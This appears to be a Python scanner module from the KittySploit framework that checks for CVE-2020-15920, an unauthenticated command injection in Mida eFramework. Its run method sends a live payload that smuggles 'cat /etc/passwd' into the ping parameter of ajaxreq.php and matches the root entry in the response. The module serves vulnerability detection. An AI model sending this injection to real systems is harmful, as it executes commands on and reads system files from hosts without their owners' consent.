#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Mida eFramework through 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Mida eFramework <=2.9.0 - Remote Command Execution Detection',
        'description': 'Mida eFramework through 2.9.0 allows an attacker to achieve remote code execution with administrative (root) privileges. No authentication is required.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'mida', 'rce', 'packetstorm', 'midasolutions', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html',
            'http://packetstormsecurity.com/files/158991/Mida-eFramework-2.9.0-Remote-Code-Execution.html',
            'http://packetstormsecurity.com/files/159194/Mida-Solutions-eFramework-ajaxreq.php-Command-Injection.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-15920',
        ],
        'cve': 'CVE-2020-15920',
    }

    def run(self):
        path = '/PDC/ajaxreq.php?PARAM=127.0.0.1+-c+0%3B+cat+%2Fetc%2Fpasswd&DIAGNOSIS=PING'
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(
                severity='critical',
                reason='Mida eFramework <=2.9.0 - Remote Command Execution detected',
                path=path,
            )
            return True
        return False

